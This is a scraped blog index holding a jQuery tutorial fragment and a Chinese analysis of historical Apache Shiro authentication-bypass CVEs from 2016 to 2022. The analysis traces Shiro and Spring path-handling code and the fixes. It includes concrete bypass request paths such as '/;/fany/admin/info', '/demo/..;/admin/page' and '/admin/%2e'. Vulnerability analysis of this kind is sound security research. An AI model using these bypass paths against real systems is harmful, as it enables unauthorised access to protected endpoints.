class2&#39;);\n\n\n\nremoveClass([class]|fn[, sw])\n\n作用：删除一个类；如果想删除多个，多个类名之间用空格隔开即可\n  $(&#39;div&#39;).removeClass(&#39;class1 class2&#39;);\n\n\n\ntoggleClass(class|fn[, sw])\n\n作用：切换类；有就删除，没有就添加\n\n\n\n\n\n`$(&apos;div&apos;).toggleClass(&apos;class1 class2&apos;);`操作文本值\njQuery操作文本值\n\nhtml\n\n和原生JS中的innerHTML一样\n  $(&#39;div&#39;).html(&#39;&lt;p&gt;我是p标签&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;&#39;);\n\n\n\ntext\n\n和原生JS中的innerText一样\n  $(&#39;div&#39;).text(&#39;&lt;p&gt;我是p标签&lt;span&gt;我是span&lt;/span&gt;&lt;/p&gt;&#39;)\n\n\n\nval\n\n设置或获取输入框值\n  $(&#39;input&#39;).val(&#39;请输入内容&#39;);\n\n\n\n\n\n\n操作CSS样式\njQuery设置css样式\ncss(name|pro|[, val|fn])\n\n\n\n// 1. 逐个设置$('div').css('width', '100px');$('div').css('height', '100px');$('div').css('background', 'red');// 2. 链式设置// 注意点：链式操作如果大于3步，建议分开$('div').css('width', '100px').css('height', '100px').css('background', 'green');// 3. 批量设置$('div').css(&#123;\twidth: '100px',\theight: '100px',\tbackground: 'blue'&#125;)// 4. 获取CSS样式值console.log($('div').css('background'));\n\n操作位置和尺寸&lt;div class=\"father\"&gt;       &lt;div class=\"son\"&gt;&lt;/div&gt;   &lt;/div&gt;   &lt;button&gt;获取&lt;/button&gt;   &lt;button&gt;设置&lt;/button&gt;\n\n\njQuery操作位置和尺寸的方法\n\nwidth([val|fn])\n\n作用：获取元素宽度\n  console.log($(&#39;.father&#39;).width());\n\n\n\nheight([val|fn])\n\n作用：获取元素高度\n  console.log($(&#39;.father&#39;).height());\n\n\n\noffset([coordinates])\n\n作用：获取元素距离窗口的偏移位\n  console.log($(&#39;.son&#39;).offset().left);\n\n\n\nposition()\n\n作用：获取元素距离定位\n  console.log($(&#39;.son&#39;).position().left);\n\n\n\nscrollTop([val])\n\n作用：获取和设置滚动偏移位  获取  console.log($(&#39;.scroll&#39;).scrollTop());  设置  $(&#39;.scroll&#39;).scrollTop(300);\n\n\nscrollLeft([val])\n\n作用同上；设置方向不同\n\n\n\n\n\n事件事件的绑定绑定事件的两个步骤\n\n获取对象\n绑定事件\n\n\n两种绑定事件方式\n\nElement.eventName(fn)\n\n编码效率略高/部分事件jQuery没有事件，所以不能添加\n$('button').clcik(function()&#123;\talert('hello event');&#125;);\n\n\n\non(eventName, fn)\n\n编码效率略低/所以js事件都可以添加\n$('button').on('click', function()&#123;\talert('hello event');&#125;);\n\n\n\n\n\n\n\n\n\n注意点\n\n    可以添加多个相同或者不同类型的事件，不会覆盖事件的移出\noff([eventName])\n\n不传递参数，会移出所有的事件\n  $(&quot;button&quot;).off();\n\n传递一个参数，会移除所有指定类型的事件\n  $(&quot;button&quot;).off(&quot;click&quot;);\n\n传递两个参数，会移除所有指定类型的指定事件\n  $(&quot;button&quot;).off(&quot;click&quot;, callBack);\n\n\n\n\n事件冒泡和默行为\n什么是事件冒泡?\n\n是一种机制；父元素father和子元素son都绑定了click事件，子元素触发click事件后，也会触发father的click事件。\n  阻止事件冒泡  第一种方式  return false  第二种方式  event.stopPropagation()\n\n\n\n什么是默认行为?\n\n也是一种机制;a标签触发单击事件后默认会打开另一个窗口,这就是默认行为\n  阻止默认行为  第一种方式  return false  第二种方式  event.preventDefault()\n\n\n\n\n事件自动触发\ntrigger()\n\n如果利用trigger自动触发事件，会触发事件冒泡和默认行为\n  $(&quot;.father&quot;).trigger(&quot;click&quot;);\n\n\n\ntriggerHandler()\n\n如果利用triggerHandler自动触发事件，不会触发事件冒泡和默认行为\n  $(&quot;.son&quot;).triggerHandler(&quot;click&quot;);\n\n\n\n\n自定义事件想要自定义事件，必须满足两个条件\n\n事件必须是通过on绑定的\n事件必须通过trigger和triggerHandler来触发\n\n$(\".son\").on(\"myClick\", function () &#123;   \talert(\"son\");   &#125;);   $(\".son\").triggerHandler(\"myClick\");\n\n事件命名空间想要事件的命名空间有效，必须满足两个条件\n\n事件是通过on来绑定的\n通过trigger和triggerHandler触发事件\n\n$(\".son\").on(\"click.zs\", function () &#123;\talert(\"click1\");&#125;);$(\".son\").on(\"click.ls\", function () &#123;\talert(\"click2\");&#125;);// $(\".son\").trigger(\"click.zs\");$(\".son\").triggerHandler(\"click.zs\");\n\n注意点\n利用trigger触发子元素带命名空间的事件, 那么父元素带相同命名空间的事件也会被触发. 而父元素没有命名空间的事件不会被触发\n\n利用trigger触发子元素不带命名空间的事件,那么子元素所有相同类型的事件和父元素所有相同类型的事件都会被触发事件的委托\n什么是事件委托?\n请别人帮忙做事情，然后将做完的结果反馈给我们\n\n\n\n\ndelegate()  $(\"button\").click(function () &#123;   \t$(\"ul\").append(\"&lt;li&gt;我是新增的li&lt;/li&gt;\");   &#125;);$(\"ul\").delegate(\"li\", \"click\", function () &#123;   \tconsole.log($(this).html()); \t &#125;);\n\n\n\n鼠标移入移出\nmouseover/mouseout\n\n子元素被移入移出也会触发父元素的事件\n$(\".father\").mouseover(function () &#123;\tconsole.log(\"father被移入了\");&#125;);$(\".father\").mouseout(function () &#123;\tconsole.log(\"father被移出了\");&#125;);\n\n\n\nmouseenter/mouseleave\n\n子元素被移入移出不会触发父元素的事件\n$(\".father\").mouseenter(function () &#123;\tconsole.log(\"father被移入了\");&#125;);$(\".father\").mouseleave(function () &#123;\tconsole.log(\"father被移出了\");&#125;);\n\n\n\nhover\n\n移入移出都会触发事件\n$(\".father\").hover(function () &#123;\tconsole.log(\"father被移入了\");&#125;,function () &#123;\tconsole.log(\"father被移出了\");&#125;);\n\n\n\n\n\njQuery原理Ajax","categories":["Javascript","jQuery"],"tags":["jQuery"]},{"title":"shiro 权限绕过历史漏洞分析","url":"/2025/01/23/shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"环境https://github.com/fanygit/SpringbootShiroDemo\nCVE-2016-6802影响版本 &lt;= 1.3.1\n漏洞利用的前提是需要配置server.servlet.context-path\nShiroConfig配置\n\napplication.properties\nserver.servlet.context-path=/fany\n\n漏洞复现正常访问，会重定向到登录页面\n\n可使用/a/../fany/admin/info、/./fany/admin/info 、/;/fany/admin/info绕过\n\n漏洞分析断点打在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain方法中，首先是获取过滤器链管理对象FilterChainManager，然后调用this.getPathWithinApplication(request)获取请求的URI\n\n跟入后，在org.apache.shiro.web.util.WebUtils#getPathWithinApplication方法中，首先会调用getContextPath方法拿到contextPath\n\n\u0000\n\u0000在getContextPath方法中，通过getAttribute获取默认为null，会通过request.getContextPath()获取\n\n最终会进入到org.apache.catalina.connector.Request#getContextPath 中\n\n\u0000\n接下来分段进行分析，这段代码的作用是去掉uri中开头多余的/，假设请求uri为//api 那么最终截取的就是/api,  uri为//api//info，则是 /api//info\nif (!this.getContext().getAllowMultipleLeadingForwardSlashInPath()) &#123;    do &#123;        ++pos;    &#125; while(pos &lt; uri.length() &amp;&amp; uri.charAt(pos) == '/');    --pos;    uri = uri.substring(pos);&#125;\n\nlastSlash默认为0，只有配置了server.servlet.context-path，lastSlash才会赋值，根据/的数量来赋值，这里配置了/fany，值就是是1，所以只会循环一次；这一块代码的作用是找到uri中第一个/ 并返回下标 。\nchar[] uriChars;for(uriChars = uri.toCharArray(); lastSlash &gt; 0; --lastSlash) &#123;    pos = this.nextSlash(uriChars, pos + 1);    if (pos == -1) &#123;        break;    &#125;&#125;private int nextSlash(char[] uri, int startPos) &#123;        int len = uri.length;        for(int pos = startPos; pos &lt; len; ++pos) &#123;            if (uri[pos] == '/') &#123;                return pos;            &#125;            if (this.connector.getEncodedSolidusHandlingInternal() == EncodedSolidusHandling.DECODE &amp;&amp; uri[pos] == '%' &amp;&amp; pos + 2 &lt; len &amp;&amp; uri[pos + 1] == '2' &amp;&amp; (uri[pos + 2] == 'f' || uri[pos + 2] == 'F')) &#123;                return pos;            &#125;        &#125;        return -1;    &#125;\n\n\nthis.removePathParameters(candidate) 是移除参数路径 /path/to/resource;param=value 变成 /path/to/resource\nUDecoder.URLDecode(candidate, this.connector.getURICharset())  url解码\nRequestUtil.normalize(candidate) 路径标准化\n// → 替换为 /\n/./ → 移除\n/../ → 找到前一段路径并移除整个 上一段路径 + /../\n\n\n\nString candidate;if (pos == -1) &#123;    candidate = uri;&#125; else &#123;    candidate = uri.substring(0, pos);&#125;candidate = this.removePathParameters(candidate);candidate = UDecoder.URLDecode(candidate, this.connector.getURICharset());candidate = RequestUtil.normalize(candidate);\n\ncanonicalContextPath 通过 this.getServletContext().getContextPath()获取，值为配置的ContextPath。\n这段代码是将被清洗过后的全路径URI与ContextPath进行匹配，匹配成功则将match置为true。没成功前则会以/xx为\u0000一节进行增量匹配，如全路径/aaa/bbb/ccc，首先会拿ContextPath与/aaa匹配，没成功，会截取/aaa/bbb，在进行清洗，再次匹配，未成功则会截取/aaa/bbb/ccc，清洗，匹配，如此往复。\nboolean match;for(match = canonicalContextPath.equals(candidate); !match &amp;&amp; pos != -1; match = canonicalContextPath.equals(candidate)) &#123;    pos = this.nextSlash(uriChars, pos + 1);    if (pos == -1) &#123;        candidate = uri;    &#125; else &#123;        candidate = uri.substring(0, pos);    &#125;    candidate = this.removePathParameters(candidate);    candidate = UDecoder.URLDecode(candidate, this.connector.getURICharset());    candidate = RequestUtil.normalize(candidate);&#125;\n\n最后，match 为 true，则截取全路径URI 到最后跟canonicalContextPath的值返回。\n if (match) &#123;    return pos == -1 ? uri : uri.substring(0, pos);&#125; else &#123;    throw new IllegalStateException(sm.getString(\"coyoteRequest.getContextPath.ise\", new Object[]&#123;canonicalContextPath, uri&#125;));&#125;\n\n总结一下，getContextPath方法的作用是从\u0000this.getRequestURI()中截取this.getServletContext().getContextPath()获得的值，感觉怪怪的，为什么不直接获取呢，来看看chatgpt回答。\n\n\u0000看着有几分道理。\n整个流程首先是this.getRequestURI()拿到全路径，去除/前多余的内容，截取第一段/xxx，通过移除路径参数、URL解码、路径归一化清洗，然后与ContextPath比较，相同则截取完整的未被清洗的全路径进行返回。\n接下来回到getPathWithinApplication方法中，是通过getContextPath拿到路径，然后通过getRequestUri拿到被清洗过的路径\n\u0000\n\ngetRequestUri 清洗后进行返回，传入/aaa/bbb/ccc/../../../fany/admin/info会变成/fany/admin/info\n\u0000\n通过以上对getContextPath方法的分析，假设我们请求的路径是/aaa/bbb/ccc/../../../fany/admin/info，经过一系列处理后，那么最终返回的还是/aaa/bbb/ccc/../../../fany/admin/info路径。通过StringUtils.startsWithIgnoreCase(requestUri, contextPath)判断requestUri的前缀是否为contextPath，一致则会从requestUri截取对应的getContextPath长度进行返回，不一致则会返回清洗后的全路径。\n\n这里很明显不会一致，所以只会返回清洗后的全路径/fany/admin/info。\n返回到org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain方法中，这里会根据路径去匹配shiro中配置的规则。\n\u0000\n这里很显然，/fany/admin/info不会被/admin/**匹配到，只会被/**匹配，而对应的是anon,代表不拦截，所以就绕过校验。\n\n修复方式在shiro-web-1.3.2.jar下org.apache.shiro.web.util.WebUtils#getContextPath中，直接对返回的路径做了一次路径归一化处理。\n\n\u0000\nCVE-2020-1957环境https://github.com/l3yx/springboot-shiro\n漏洞版本\nApache Shiro &lt;= 1.5.1\n无需配置server.servlet.context-path\nspring-boot &lt;=2.3.0（注意：当 Spring Boot &gt;2.3.0 时，这种方法能绕过shiro权限校验，但是会找不到对应的路由。 ）\n\n漏洞复现\n漏洞分析断点打在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain中\n\n\u0000跟入到org.apache.shiro.web.util.WebUtils#getPathWithinApplication方法中，因为未配置server.servlet.context-path，getContextPath(request)获取的值为空。\n\n跟入getRequestUri，调用request.getRequestURI()获取全路径\n\u0000\n\n\u0000\u0000然后调用decodeAndCleanUriString截取;前的url，请求的路径为/demo/..;/admin/page截取后变成/demo/..。\n\n在调用normalize路径标准化，截取后的url为/demo/..这里并不会做任何处理，原样返回。\n\nnormalize 路径标准化\n// → 替换为 /\n/./ → 移除\n/../ → 找到前一段路径并移除整个 上一段路径 + /../\n\n\n\n\n回到getPathWithinApplication方法总，getContextPath(request) 拿到的是&quot;&quot;，getRequestUri(request)拿到的是/demo/..，因为是截取requestUri的contextPath的长度进行返回，这里contextPath长度为0，所以会原样返回/demo/..，\u0000\n\nshiro 路径配置\n\n/demo/.. 不会匹配上任何过滤器，相当于没有拦截器。\n\n#####当spring-boot &lt;=2.3.0时，alwaysUseFullPath为false\n在org.springframework.web.util.UrlPathHelper的getLookupPathForRequest中\n\n\u0000会调用this.getPathWithinServletMapping(request)，获取servletPath进行返回 ，如果spring-boot &gt;2.3.0 则会找不到路由。\n\n修复方式在org.apache.shiro.web.util.WebUtils#getRequestUri中，更换了获取全路径的方式\nuri = valueOrEmpty(request.getContextPath()) + \"/\" + valueOrEmpty(request.getServletPath()) + valueOrEmpty(request.getPathInfo());\n\n\u0000\u0000这里是基于request.getServletPath()获取的路径进行处理\n\nCVE-2020-11989漏洞版本Apache Shiro &lt;= 1.5.2\n需要配置server.servlet.context-path\n漏洞复现\n漏洞分析如果对CVE-2016-6802漏洞理解透彻后，再来理解这个漏洞，会容易很多。\n在org.apache.shiro.web.util.WebUtils#getContextPath方法中，对返回的request.getContextPath()的路径调用normalize(decodeRequestString(request, contextPath))进行处理，\u0000\n\n首先是url解码\n\n然后路径归一化处理\npublic static String normalize(String path) &#123;        return normalize(path, true);    &#125;    private static String normalize(String path, boolean replaceBackSlash) &#123;        if (path == null) &#123;            return null;        &#125; else &#123;            String normalized = path;            if (replaceBackSlash &amp;&amp; normalized.indexOf(92) &gt;= 0) &#123;                normalized = normalized.replace('\\\\', '/');            &#125;            if (normalized.equals(\"/.\")) &#123;                return \"/\";            &#125; else &#123;                if (!normalized.startsWith(\"/\")) &#123;                    normalized = \"/\" + normalized;                &#125;                while(true) &#123;                    int index = normalized.indexOf(\"//\");                    if (index &lt; 0) &#123;                        while(true) &#123;                            index = normalized.indexOf(\"/./\");                            if (index &lt; 0) &#123;                                while(true) &#123;                                    index = normalized.indexOf(\"/../\");                                    if (index &lt; 0) &#123;                                        return normalized;                                    &#125;                                    if (index == 0) &#123;                                        return null;                                    &#125;                                    int index2 = normalized.lastIndexOf(47, index - 1);                                    normalized = normalized.substring(0, index2) + normalized.substring(index + 3);                                &#125;                            &#125;                            normalized = normalized.substring(0, index) + normalized.substring(index + 2);                        &#125;                    &#125;                    normalized = normalized.substring(0, index) + normalized.substring(index + 1);                &#125;            &#125;        &#125;    &#125;\n\n细心的小伙伴，可能会发现，在org.apache.catalina.connector.Request#getContextPath中，在url解码和路径归一化前还调用了removePathParameters移除路径中的参数，\n\n/path/to/resource;param=value 变成 /path/to/resource\n\n这里注意的是getContextPath返回的路径是直接截取全路径,并不是被处理过后的路径。\n\n也就是对返回路径的处理中存在一个去除参数的差异，如果路径中存在; 那么还是会保留，假设请求路径为/;/fany/admin/info，那么这里返回的还是/;/fany/admin/info\n\ngetRequestUri(request)获取路径，通过request.getContextPath()、request.getServletPath()、request.getPathInfo()拼接拿到uri\n\n然后调用org.apache.shiro.web.util.WebUtils#decodeAndCleanUriString\n这个方法会截取分号之前的字符串进行返回，如/aaa;/xxx 中，返回/aaa，/;/fany/admin/info 返回/\n\n经过StringUtils.startsWithIgnoreCase(requestUri, contextPath)验证，验证requestUri=/中的前缀是否为contextPath=/;/fany，很明显，肯定不满足。\n\n\u0000这里会返回requestUri的值/\n还是回到shiro配置中，/只会被/**匹配，而对应的是anon, 代表不拦截，所以就绕过校验。\n\n修复方式shiro-web-1.5.3.jar中\n在org.apache.shiro.web.util.WebUtils#getPathWithinApplication方法中，删除了其他处理路径的方式，直接通过getServletPath获取路径。\n\nCVE-2020-13933漏洞版本\nApache Shiro &lt;= 1.5.1\n\nShiroConfig配置\n\n特定的接口\n\n漏洞复现\n漏洞分析\u0000在org.apache.shiro.web.util.WebUtils#getPathWithinApplication方法中\n\n请求url为/admin/%3baaaa，getServletPath(request) 获取到的为/admin/;aaaa，浏览器会进行一次url解码\n\n接下来会调用removeSemicolon\u0000方法进行处理，截取;前的字符串，/admin/;aaaa变成/admin/\n\n最后调用normalize，路径标准化处理，最终不会做任何处理，还是返回/admin/\n\n// → 替换为 /\n/./ → 移除\n/../ → 找到前一段路径并移除整个 上一段路径 + /../\n\n\u0000回到org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain，会截取末尾的/变成/admin\n\n\u0000然后会根据路径匹配对应规则，走对应的过滤器，这里规则为/admin/*，被处理后的路径为/admin，从而绕过校验。\n\n修复方式获取路径上并未做任何改动，修复方式则是在全局过滤器中默认添加了invalidRequest这个过滤器。\n在org.apache.shiro.web.filter.InvalidRequestFilter#isAccessAllowed中，调用了this.containsSemicolon(uri)\n\u0000\n\u0000containsSemicolon方法用于检测路径中有;、%3b、%3B这几个字符串\n\ncontainsBackslash方法用于检测路径中有\\、%5c、%5C\n\u0000\ncontainsNonAsciiCharacters检测检查给定的字符串是否仅包含可打印的 ASCII 字符\n\n\nCVE-2020-17510漏洞版本Shiro &lt;= 1.6.0\nSpring Boot &gt;2.3.0.RELEASE\n\n配置ShiroConfig\n\n特定路由\n\n漏洞复现\n漏洞分析断点打在 org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain中\n\n跟入到org.apache.shiro.web.util.WebUtils#getPathWithinApplication中，这里通过getServletPath(request)获取请求的路径/admin/(这里是被tomcat标准化后的)，getPathInfo(request)不会获取到任何信息，接下来会依次调用removeSemicolon、normalize进行处理。\u0000\n\n\u0000\u0000\nremoveSemicolon截取;之前的字符串，ServletPath为\u0000/admin/，并不会做任何处理\n\nnormalize路径标准化，还是不会做任何处理，还是返回/admin/\n\n// → 替换为 /\n/./ → 移除\n/../ → 找到前一段路径并移除整个 上一段路径 + /../\n\n\n最终调用this.getPathWithinApplication(request)处理后的结果为/admin/\n\n调用requestURI.substring(0, requestURI.length() - 1) 会移除末尾的/，得到/admin\n\n\u0000\n接下来会通过/admin依次匹配ShiroConfig中配置的拦截路径。\n\u0000\n/admin/* 只能匹配 /admin/xxx，并不能匹配/admin，所以这里会返回false。\n\n因为此前修复CVE-2020-11989，增加默认的FilterInvalidRequestFilter，只会检测路径中有;、%3b、%3B、\\、%5c、%5C等字符串，并没有检查%2e和.，所以这里依旧能够通过。\n绕过过了Shiro认证，接下来进入到Spring中\n在org.springframework.web.servlet.DispatcherServlet#doDispatch为入口，跟入到org.springframework.web.servlet.handler.AbstractHandlerMapping#initLookupPath中\ninitLookupPath:572, AbstractHandlerMapping (org.springframework.web.servlet.handler)getHandlerInternal:380, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)getHandlerInternal:125, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)getHandlerInternal:67, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)getHandler:498, AbstractHandlerMapping (org.springframework.web.servlet.handler)getHandler:1265, DispatcherServlet (org.springframework.web.servlet)doDispatch:1047, DispatcherServlet (org.springframework.web.servlet)doService:964, DispatcherServlet (org.springframework.web.servlet)\n\nSpring Boot &gt;2.3.0.RELEASE 时，this.usesPathPatterns()默认为true，通过ServletRequestPathUtils.getParsedRequestPath(request)获取请的路径，调用UrlPathHelper.defaultInstance.removeSemicolonContent(lookupPath)进行处理，并未发生改变，最终返回/admin/%2e\n\n\u0000org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition#getMatchingPatterns将路径/admin/%2e与mappings进行匹配，最终会匹配到/admin/{id}\n\u0000\n为什么只能在Spring Boot &gt;2.3.0.RELEASE 下利用？Springboot 2.3.0.RELEASE\u0000下\n在org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal中，通过this.getUrlPathHelper().getLookupPathForRequest(request)处理路径\n\n\u0000\n在getLookupPathForRequest方法中，&lt;=2.3.0.RELEASE，this.alwaysUseFullPath为false，调用this.getPathWithinServletMapping(request)处理路径\n\ngetPathWithinServletMapping\npublic String getPathWithinServletMapping(HttpServletRequest request) &#123;        String pathWithinApp = this.getPathWithinApplication(request);        String servletPath = this.getServletPath(request);        String sanitizedPathWithinApp = this.getSanitizedPath(pathWithinApp);        String path;        if (servletPath.contains(sanitizedPathWithinApp)) &#123;            path = this.getRemainingPath(sanitizedPathWithinApp, servletPath, false);        &#125; else &#123;            path = this.getRemainingPath(pathWithinApp, servletPath, false);        &#125;        if (path != null) &#123;            return path;        &#125; else &#123;            String pathInfo = request.getPathInfo();            if (pathInfo != null) &#123;                return pathInfo;            &#125; else &#123;                if (!this.urlDecode) &#123;                    path = this.getRemainingPath(this.decodeInternal(request, pathWithinApp), servletPath, false);                    if (path != null) &#123;                        return pathWithinApp;                    &#125;                &#125;                return servletPath;            &#125;        &#125;    &#125;\n\n进入到，getContextPath获取配置的ContextPath，this.getRequestUri(request)获取全路径uri。\u0000\n\norg.springframework.web.util.UrlPathHelper#getRemainingPath方法解析\nprivate String getRemainingPath(String requestUri, String mapping, boolean ignoreCase) &#123;    int index1 = 0;    int index2 = 0;    while(true) &#123;        // 同时遍历 requestUri 和 mapping         if (index1 &lt; requestUri.length() &amp;&amp; index2 &lt; mapping.length()) &#123;            // 拿到requestUri字符            char c1 = requestUri.charAt(index1);            // 拿到mapping 字符            char c2 = mapping.charAt(index2);            // requestUri 如果匹配到;  // 查找从当前位置开始的下一个 '/'，跳过路径参数            if (c1 == ';') &#123;                index1 = requestUri.indexOf(47, index1);                // 如果找不到 '/'，表示路径格式异常，返回 null                if (index1 == -1) &#123;                    return null;                &#125;                // // 更新 c1 为下一个 '/' 的字符                c1 = requestUri.charAt(index1);            &#125;            // 判断当前字符是否匹配 忽略大小写            if (c1 == c2 || ignoreCase &amp;&amp; Character.toLowerCase(c1) == Character.toLowerCase(c2)) &#123;                ++index1;                ++index2;                continue;            &#125;            // 如果字符不匹配，则直接返回 null            return null;        &#125;        // 如果 mapping 未完全匹配完，则返回 null        if (index2 != mapping.length()) &#123;            return null;        &#125;                // 如果 requestUri 遍历完了，并且 mapping 正好匹配完，返回空字符串        if (index1 == requestUri.length()) &#123;            return \"\";        &#125;        // 如果剩余部分以 ';' 开头，继续跳过路径参数        if (requestUri.charAt(index1) == ';') &#123;            index1 = requestUri.indexOf(47, index1);        &#125;        // 如果还有剩余路径，返回从当前索引到末尾的部分        return index1 != -1 ? requestUri.substring(index1) : \"\";    &#125;&#125;\n\ngetRemainingPath方法的作用是将requestUri与contextPath进行匹配，并截取出contextPath后的字符串。首先同时遍历requestUri、\u0000\u0000contextPath两个变量字符串，会跳过requestUri中;到/的字符，ignoreCase 为true，忽略大小写进行匹配，如此循环，如超出contextPath中长度，则停止，并截取requestUri当前遍历到的下标剩余字符串，如contextPath=、requestUri=/admin/.，则截取/admin/.。\n\n回到getPathWithinServletMapping中，this.getSanitizedPath(pathWithinApp)移除双斜杠//，然后会再次调用getRemainingPath进行处理，最后处理后，只剩下一个.\u0000。\n\u0000\n通过. 自然无法找到对应的HandlerMethod对象。\n\n然而Spring Boot &gt;2.3.0.RELEASE时，this.alwaysUseFullPath=true时，仅仅只调用getPathWithinApplication处理\n\n返回/admin/.`\n\n\u0000找到对应的HandlerMethod对象\n\n漏洞修复新增类ShiroUrlPathHelper\u0000继承至UrlPathHelper，重写了getPathWithinApplication和getPathWithinServletMapping，通过配置，Spring处理路径时，会调用如下两个方法拿到路径。\n\n也就是还需要相关配置，才能生效，修复的原理是替换原本的Spring处理路径的方式为Shiro处理的方式。\nCVE-2020-17523漏洞版本Shiro &lt;= 1.7.0\n漏洞复现\n漏洞分析这个漏洞的根因是在调用this.pathMatches(pathPattern, requestURI)匹配路径时，会将requestURI、pathPattern进行处理，去除首尾空字符串造成的。\n\n跟入后，在org.apache.shiro.util.AntPathMatcher#doMatch，会调用StringUtils.tokenizeToStringArray(pattern, this.pathSeparator)处理路径\u0000\n\ntokenizeToStringArray方法在处理路径时，会删除空字符串\n\n这里处理的路径为/admin/，处理后会变成admin\n\n\u0000返回false\n\n\u0000\n在org.springframework.web.servlet.handler.AbstractHandlerMapping#initLookupPath中，会返回/admin/%20\n\n/admin/{id}成功匹配到/admin/%20\n\n漏洞修复org.apache.shiro.util.AntPathMatcher#doMatch中 trimTokens 被默认指定为false\n\n这里就不会去除空白字符\n\n\u0000\nCVE-2021-41303漏洞版本Shiro == 1.7.1 \n特定场景\n\n\n漏洞复现\n漏洞分析这个漏洞是1.7.0更新到1.7.1时，修改org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain匹配路径逻辑所造成的绕过，并且需要特定配置，攻击面可能不大。\n1.7.1之前的方法(这个方法是根据请求的路径关联对应的过滤器链)\npublic FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123;    FilterChainManager filterChainManager = this.getFilterChainManager();    if (!filterChainManager.hasChains()) &#123;        return null;    &#125; else &#123;        String requestURI = this.getPathWithinApplication(request);        if (requestURI != null &amp;&amp; !\"/\".equals(requestURI) &amp;&amp; requestURI.endsWith(\"/\")) &#123;            requestURI = requestURI.substring(0, requestURI.length() - 1);        &#125;        Iterator var6 = filterChainManager.getChainNames().iterator();        String pathPattern;        do &#123;            if (!var6.hasNext()) &#123;                return null;            &#125;            pathPattern = (String)var6.next();            if (pathPattern != null &amp;&amp; !\"/\".equals(pathPattern) &amp;&amp; pathPattern.endsWith(\"/\")) &#123;                pathPattern = pathPattern.substring(0, pathPattern.length() - 1);            &#125;        &#125; while(!this.pathMatches(pathPattern, requestURI));        if (log.isTraceEnabled()) &#123;            log.trace(\"Matched path pattern [\" + pathPattern + \"] for requestURI [\" + Encode.forHtml(requestURI) + \"].  Utilizing corresponding filter chain...\");        &#125;        return filterChainManager.proxy(originalChain, pathPattern);    &#125;&#125;\n\n如上方法，通过this.getPathWithinApplication(request)拿到处理后的路径，然后会处理路径后面的/，如请求路径为/admin/info/,那么处理后为/admin/info，接下来就是与filterChainManager中的过滤器按顺序进行匹配，匹配成功则进行绑定。\n\u0000  1.7.1之后的方法\npublic FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123;    FilterChainManager filterChainManager = this.getFilterChainManager();    if (!filterChainManager.hasChains()) &#123;        return null;    &#125; else &#123;        String requestURI = this.getPathWithinApplication(request);        String requestURINoTrailingSlash = removeTrailingSlash(requestURI);        Iterator var7 = filterChainManager.getChainNames().iterator();        String pathPattern;        do &#123;            if (!var7.hasNext()) &#123;                return null;            &#125;            pathPattern = (String)var7.next();            if (this.pathMatches(pathPattern, requestURI)) &#123;                if (log.isTraceEnabled()) &#123;                    log.trace(\"Matched path pattern [&#123;&#125;] for requestURI [&#123;&#125;].  Utilizing corresponding filter chain...\", pathPattern, Encode.forHtml(requestURI));                &#125;                return filterChainManager.proxy(originalChain, pathPattern);            &#125;            pathPattern = removeTrailingSlash(pathPattern);        &#125; while(!this.pathMatches(pathPattern, requestURINoTrailingSlash));        if (log.isTraceEnabled()) &#123;            log.trace(\"Matched path pattern [&#123;&#125;] for requestURI [&#123;&#125;].  Utilizing corresponding filter chain...\", pathPattern, Encode.forHtml(requestURINoTrailingSlash));        &#125;        return filterChainManager.proxy(originalChain, requestURINoTrailingSlash);    &#125;&#125;\n\n如上是更新后的，同样也是通过this.getPathWithinApplication(request)拿到处理后的路径，然后调用removeTrailingSlash(requestURI)处理路径后的/得到requestURINoTrailingSlash。然后进行匹配，首先会拿到requestURI，也就是没有处理过/的路径与shiro中注册的路径进行匹配，匹配成功会用requestURI进行绑定，如果未匹配成功，会调用removeTrailingSlash(pathPattern)处理shiro中注册的路径，然后与被处理过的requestURINoTrailingSlash进行匹配，成功则用requestURINoTrailingSlash绑定。\n\n如上的方式在特定场景下，会造成权限绕过的问题，如下配置。\nfilterChainDefinitionMap.put(\"/admin/*\", \"authc\");filterChainDefinitionMap.put(\"/admin/info\", \"anon\");\n\n\n\n\n假设请求为/admin/info/，首先会拿/admin/info/在LinkHashMap中查找，/admin/*无法匹配到/admin/info/，第一次肯定会找不到，然后会用处理的路径/admin/info进行查找，会匹配上/admin/info，也同时会返回处理过的requestURINoTrailingSlash，通过requestURINoTrailingSlash获去对应的过滤器为anon，即可绕过验证。\n\u0000\n漏洞修复修复之后是通过filterChainManager.getChainNames()拿到的路径进行匹配\n\u0000\nCVE-2022-32532漏洞版本Shiro &lt;= 1.9.0\n\u0000\n漏洞环境https://github.com/fanygit/CVE-2022-32532 